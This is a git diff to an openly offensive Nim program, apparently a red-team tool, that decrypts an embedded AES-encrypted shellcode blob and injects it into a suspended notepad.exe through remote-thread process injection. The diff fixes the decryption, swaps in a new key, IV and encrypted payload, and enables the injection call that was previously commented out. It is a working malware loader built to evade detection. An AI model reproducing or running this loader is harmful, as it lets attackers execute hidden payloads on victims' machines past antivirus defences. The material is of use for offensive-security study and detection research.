@@ -1,7 +1,13 @@
 #[
     Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim
+    Reference: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_shellcode_loader.nim
 
-  - Decryption not working right now, need to investigate further.
+  - Same injection technique as shellcode_hollowing.nim
+  - Decryption working correctly now.
+  - Copy IV, key, and encrypted shellcode output from encrypt_aes.nim into the matching fields near the bottom of this file
+
+  TODO:
+    - Update to make more modular to avoid needing to re-compile each time (see 2nd reference above)
 
 ]#
 
@@ -14,24 +20,30 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
+proc toString(bytes: openarray[byte]): string =
+  result = newString(bytes.len)
+  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
+  return result
+
 proc decryptAES(shellcode: string, aes_key: string, iv: string): string =
   var
-    ectx, dctx: CTR[aes256]
+    dctx: CTR[aes256]
     key = fromHex(aes_key)
     iv = fromHex(iv)
-    enctext = fromHex(shellcode)
-    dectext = newSeq[byte](len(fromHex(shellcode)))
+    enctext: seq[byte] = fromHex(shellcode)
+    dectext: seq[byte] = newSeq[byte](len(fromHex(shellcode)))
 
   dctx.init(key, iv)
   dctx.decrypt(enctext, dectext)
   dctx.clear()
 
-  echo "Encrypted text: ", toHex(enctext)
-  echo "Decrypted text: ", toHex(dectext)
+  #echo "Encrypted text: ", toHex(enctext)
+  #echo "Decrypted text: ", toHex(dectext)
 
   return toHex(dectext)
 
-proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
+proc injectCreateRemoteThread[byte](shellcode: openarray[byte]): void =
 
   let tProcess = startProcess("notepad.exe")
   tProcess.suspend()
@@ -52,8 +64,9 @@ proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
   echo "[*] WriteProcessMemory: ", bool(wSuccess)
   echo "    \\-- bytes written: ", bytesWritten
   echo ""
-
-  var consoleInput = readLine(stdin);
+  
+  #DEBUG
+  #var consoleInput = readLine(stdin);
 
   var oldProtect: DWORD
   let protSuccess = VirtualProtectEx(pHandle, cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)
@@ -72,12 +85,13 @@ when defined(windows):
 
   # This is essentially the equivalent of 'if __name__ == '__main__' in python
   when isMainModule:
-    # Replace these values with encrypted shellcode and associated AES key
-    let iv = "660491301D94D53B0DDD4BFC2234FDDE"
-    let key = "7EADB38E62D0469A6DE4DC664AC4179AAEC864FE29E7359162E8586C809D481A"
-    var shellcode_enc = "C0A5E603CB6B9DF8888C82AFF66A341C376A33AEC64DDD6A5B24D7C3FCAACBBCACD088BB935CAF7B1D496BC2397C61D488552176AA94855B0DA3207CFC0152B623B27FF5724B24D3A329EE26975534008CD750216FADDE6F8DD591D5E988CAB985E5CD708A6D8372EC252F737E389119566F5122B03941943CDA17DC91A90FF49DA1D750E47512F82176A96DD8F03EC9D6E905A0BA8970DA105DCE6E2E51A8ADA1D00270C7284425F0D8ADC55A70FB3CEAE31B71BD9259EB58A3A34CC0AA77AC009349EC434E70B6D5C24F3CFB9F943683B654B98FE6FD74381B0E3A489393785D8AAA3B9FF2E7DDBC8078298DD32CDFF9A65D8DEF59F27BA71E5EB17E64F1466194BEDD760A24E86A23FE1E2748C1272D6D6180EC25E9521E52811B67A0490F69A0704750CD00470771F9700DD1B595578482E6B75F71E8DEE1DEE135B6A0BEC92454563F563E04CEA244DD923D1CEB3F73D80AA2882D15396D266FCE377D1F6001CCC888D97594A19FD1DB8C0781A80611DA8AD9B113C4296A56E0E79912E2C4141839243CCC6F"
+    # Replace these values with IV, AES key, and encrypted shellcode printed by encrypt_aes.nim
+    let iv = "EE9B4C89192F8D87DB36A4A27C1AA576"
+    let key = "BACF17571CF7ADB7796B3BD186063E44C8935CCBB15366F2C2156EA7CADDC4DB"
+    var shellcode_enc = "A052BFF4AFFA14AA8F9B8BB33EBE3A6C4EC2835127AB493449E3D41D8B61A7993DB4D1DEC5C035F644B0E2CF9CF4DBD46BDA104B3856F9CE78FDB00A8FFA798C51CE81D36E3C7028D8F5870E6755B002A33DFD4A8CF428BB15C702B530426B7D9E8660A90F9254D9E3578469E278D774909E38567E0D31996925EFC88DDAB1477707FF6314A1AF138578E4D3AD7154339CDD324D8275998481F1F4949D9E6D656CD33B8A42C1CBE0942C6787F697EBA34CC8C22263519365A0D2424EE2C5FB9165B15F7A31EFFD88484AB3DA7C9486E6CD5E59F12DB4269C1D721B2C9E83C427BB071CE8CD26A7228FBC4F703956D37904BBC60C32BA5CAF9DAC8647525D0BD050747C9D626875AD375E46A57D5F9CAD0EFC161CD9948392AD6C7A042C73AB239FA0E3A8E8FB9CF15CE823531511D1511ADC349A36CAA265BA536947D360119EB91006891303F0DCDA0B22CFD320358FD276D323A39D51FDEAA7AA46FAF49B1DBAA6491961DA583F317A487263EB4C233593A7AE7B1E4EDF8A0202DDB4D35B789B5612BCD84961E2"
+    var shellcode: seq[byte] = newSeq[byte](len(fromHex(shellcode_enc)))
 
-    var shellcode_b64 = fromHex(decryptAES(shellcode_enc, key, iv))
-    echo "B64 shellcode: ", shellcode_b64
-    #var shellcode: array[293, byte] = decode(shellcode_b64)
-    #injectCreateRemoteThread(shellcode)
+    var shellcode_b64 = toString(fromHex(decryptAES(shellcode_enc, key, iv)))
+    #echo "B64 shellcode: ", shellcode_b64
+    shellcode = toByteSeq(decode(shellcode_b64))
+    injectCreateRemoteThread(shellcode)
